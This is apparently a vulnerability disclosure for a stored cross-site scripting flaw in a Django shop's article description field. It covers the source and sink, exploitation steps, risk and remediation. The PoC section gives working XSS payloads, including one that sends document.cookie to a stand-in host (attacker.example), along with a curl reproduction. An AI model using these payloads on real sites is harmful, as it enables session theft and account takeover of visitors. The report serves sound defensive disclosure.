# Description

**CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')**, stored variant.

The article (CSS loader) `description` field is saved to the database without any HTML escaping and is later rendered on the public shop page with Django's `|safe` filter, which disables auto-escaping.

- **Sink (template):** `Shopping/templates/shop.html:313`
  ```django
  {% if css.description %}<p class="article-description">{{ css.description|safe }}</p>{% endif %}
  ```
  This sits inside the `{% for css in css_files %}` loop (line 302) that renders every listing card on `/shop/`.
- **Source (write path):** `Shopping/views.py:1306` in `add_article()`
  ```python
  description = request.POST.get('description', '').strip()
  ```
  The value is only whitespace-trimmed. It is never passed through `escape()` or any sanitiser, and it is saved verbatim at `Shopping/views.py:1362-1364` via `Css.objects.create(..., description=description, ...)`.

Neighbouring fields in the same view (`name`, `author`) are clipped but also not escaped, so the only thing standing between user input and the DOM is the auto-escape that `|safe` removes. Any user with the Developer role (or admin/staff) can therefore store a script that executes in the browser of every visitor to the shop.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Obtain a Developer role account (buy the developer role in the Account Store, or be granted it). The `add_article` view rejects users whose `Profile.role` is not `developer`/`admin`/`staff` (`Shopping/views.py:1288-1300`). | Account can access the seller form. |
| 2 | Log in and open the seller form at `GET /shop/sell/` (route in `Shopping/urls.py:65`, mounted under `/shop/` by `djangoWocshack_5/urls.py:44`). | `add_article.html` form is displayed with the `description` textarea. |
| 3 | Submit `POST /shop/sell/` with the required fields (`name`, `css_content`, `author`) and the payload in `description`, for example `<img src=x onerror="alert(document.domain)">`. | `Css` row is created with the raw payload in `description`. The user is redirected to the product page. |
| 4 | Visit `GET /shop/` as any user (the victim does not need to be logged in to the seller area; the payload fires on any page load of the shop). | Shop template renders `{{ css.description\|safe }}` unescaped. The `<img>` tag fails to load `src=x` and the `onerror` handler runs in the victim's origin. |
| 5 | Replace the proof-of-concept with a session-stealing or action-performing payload (see PoC). | Attacker can read non-HttpOnly cookies, issue authenticated requests as the victim, or deface the shop. |

# PoC

Minimal proof of execution, entered in the **description** field of the `/shop/sell/` form:

```html
<img src=x onerror="alert(document.domain)">
```

Data-exfiltration variant (for an authorised lab only):

```html
<img src=x onerror="fetch('https://attacker.example/collect?c='+encodeURIComponent(document.cookie))">
```

Reproduction with curl (replace the session cookie and CSRF token from a logged-in developer session):

```bash
curl -s -b dev.cookies -c dev.cookies -X POST http://localhost:8000/shop/sell/ \
  -H "Referer: http://localhost:8000/shop/sell/" \
  --data-urlencode "csrfmiddlewaretoken=$CSRF" \
  --data-urlencode "name=Test Loader $RANDOM" \
  --data-urlencode "author=devuser" \
  --data-urlencode "price=0" \
  --data-urlencode 'description=<img src=x onerror="alert(document.domain)">' \
  --data-urlencode "css_content=.loader{color:red}"

# Verify the payload is emitted unescaped on the shop page
curl -s http://localhost:8000/shop/ | grep -o '<p class="article-description">[^<]*'
```

Expected output contains `<p class="article-description"><img src=x onerror="alert(document.domain)"></p>` with no `&lt;` encoding. Opening `/shop/` in a browser then shows the alert.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Script runs in the origin of `/shop/` for every visitor. Any non-HttpOnly data (and any data reachable through same-origin `fetch`, such as account pages) can be read and exfiltrated. Admin or staff visitors can be targeted for a privileged session. |
| Integrity | Attacker-controlled JavaScript can submit state-changing requests as the victim (purchases, profile changes, role or listing edits), and can rewrite the shop page for all visitors. The payload is persistent, so each visit re-executes it. |
| Availability | A payload can redirect visitors, loop alerts, or break the shop page for everyone until the listing is removed or the description is cleaned up by an admin. |

Overall severity: **Medium** — the sink is persistent and reaches every shop visitor without interaction beyond loading the page, which is serious. It is rated Medium rather than High because the write requires an authenticated Developer role, which must first be obtained through the store or granted by an admin. This matches the CVSS 3.1 vector `AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` (6.1) recorded in the dev README.

# Remediation

1. Escape the description on input, consistent with the other text fields in the view. In `Shopping/views.py:1306`:
   ```python
   from django.utils.html import escape
   description = escape(request.POST.get('description', '').strip()[:5000])
   ```
   Escaping on input is defence in depth only; the output-side fix below is the primary control.
2. Remove the `|safe` filter from `Shopping/templates/shop.html:313` so Django's auto-escaping applies:
   ```django
   {% if css.description %}<p class="article-description">{{ css.description }}</p>{% endif %}
   ```
   If plain-text output is needed, also strip or escape any existing stored values in the database (one-off data migration), since escaping on input alone does not fix rows already written.
3. If rich-text descriptions are required, render them through a real sanitiser such as `bleach.clean()` with a strict tag and attribute allow-list, not a regex-based filter.
4. Add a `Content-Security-Policy` header with `script-src 'self'` (and no `'unsafe-inline'`) so injected inline event handlers such as `onerror` are blocked even if a bypass is found.
5. Consider setting `HttpOnly` and `SameSite` on session cookies so a successful injection cannot read the session token from `document.cookie`.

# Author
WOCSA
